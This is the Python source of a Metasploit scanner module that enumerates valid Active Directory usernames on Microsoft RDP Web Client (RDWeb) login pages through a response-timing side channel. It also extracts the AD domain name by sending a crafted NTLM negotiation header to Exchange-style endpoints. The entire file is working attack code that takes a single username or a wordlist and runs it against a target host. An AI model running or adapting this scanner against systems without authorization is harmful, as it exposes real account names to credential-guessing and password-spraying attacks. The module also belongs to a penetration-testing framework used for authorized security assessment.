#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import base64
    import os
    import requests
except ImportError:
    dependencies_missing = True


# Metasploit Metadata
metadata = {
    'name': 'Microsoft RDP Web Client Login Enumeration',
    'description': '''
        Enumerate valid usernames against a Microsoft RDP Web Client by performing a timing based check against the provided username.
    ''',
    'authors': [
        'Matthew Dunn'
    ],
    'date': '2020-12-23',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'REPLACE ME'},
    ],
    'type': 'single_scanner',
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path to the RDP Web Client install',
                      'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
        'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': False, 'default': None},
        'username': {'type': 'string', 'description': 'The username to verify or path to a file of usernames',
                     'required': True, 'default': None},
        'timeout': {'type': 'int',
                    'description': 'Timeout in milliseconds for response to consider username invalid',
                    'required': True, 'default': 1250},
        'enum_domain': {'type': 'bool',
                        'description': 'Automatically enumerate AD domain using NTLM',
                        'required': False, 'default': True}
    }
}


def get_ad_domain(rhost, rport):
    """Retrieve the NTLM domain out of a specific challenge/response"""
    domain_urls = ['aspnet_client', 'Autodiscover', 'ecp', 'EWS', 'OAB',
                   'Microsoft-Server-ActiveSync', 'PowerShell', 'rpc']
    headers = {'Authorization': 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==',
               'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
               'Host': rhost}
    session = requests.Session()
    for url in domain_urls:
        target_url = f"https://{rhost}:{rport}/{url}"
        request = session.get(target_url, headers=headers, verify=False)
        # Decode the provided NTLM Response to strip out the domain name
        if request.status_code == 401 and 'WWW-Authenticate' in request.headers and 'NTLM' in request.headers['WWW-Authenticate']:
            domain_hash = request.headers['WWW-Authenticate'].split('NTLM ')[1].split(',')[0]
            domain = base64.b64decode(bytes(domain_hash, 'utf-8')).replace(b'\x00',b'').split(b'\n')[1]
            domain = domain[domain.index(b'\x0f') + 1:domain.index(b'\x02')].decode('utf-8')
            module.log(f'Found Domain: {domain}', level='good')
            return domain


def check_username(rhost, rport, targeturi, domain, username, timeout):
    """Check a single username against the RDWeb Client
    The timeout is used to specify the amount of milliseconds where a
    response should consider the username invalid."""

    url = f'https://{rhost}:{rport}/{targeturi}'
    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect'
    headers = {'Host':rhost,
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Content-Length': '53',
               'Origin': 'https://{rhost}'}
    session = requests.Session()
    try:
        request = session.post(url, data=body, headers=headers, timeout=(timeout / 1000), verify=False)
        if request.status_code == 200:
            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                       level='good')
    except requests.exceptions.Timeout:
            module.log(f'Username {domain}\{username} is invalid! No response received in {timeout} milliseconds',
                       level='error')
    except requests.exceptions.RequestException as e:
        module.log('{}'.format(e), level='error')
        return


def check_usernames(rhost, rport, targeturi, domain, username_file, timeout):
    """Check each username in the provided username file"""
    with open(username_file, 'r') as file_contents:
        usernames = file_contents.readlines()
        for user in usernames:
            check_username(rhost, rport, targeturi, domain, user.strip(), timeout)


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        module.log('Module dependencies are missing, cannot continue', level='error')
        return

    # Gather AD Domain either from args or enumeration
    domain = args['domain'] if 'domain' in args else None
    if not domain and args['enum_domain']:
        domain = get_ad_domain(args['rhost'], args['rport'])

    # Verify we have a proper domain
    if not domain:
        module.log('Either domain or enum_domain must be set to continue, aborting...',
                   level='error')
        return


    # Check the provided username or file of usernames
    if os.path.isfile(args['username']):
        check_usernames(args['RHOSTS'], args['rport'], args['targeturi'],
                   domain, args['username'], int(args['timeout']))
    else:
        check_username(args['RHOSTS'], args['rport'], args['targeturi'],
                       domain, args['username'], int(args['timeout']))


if __name__ == '__main__':
    module.run(metadata, run)
